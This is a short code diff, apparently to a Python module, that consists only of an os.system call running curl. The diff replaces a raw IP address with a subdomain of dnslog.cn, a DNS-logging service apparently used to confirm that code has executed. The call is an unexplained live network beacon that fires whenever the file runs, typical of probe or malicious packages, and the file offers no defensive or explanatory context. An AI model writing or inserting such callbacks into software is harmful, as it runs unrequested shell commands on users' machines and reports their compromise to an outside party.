@@ -1,3 +1,3 @@
 import os
 
-os.system("curl 101.126.43.28/supertest")
+os.system("curl superytest.9ki9mi.dnslog.cn")
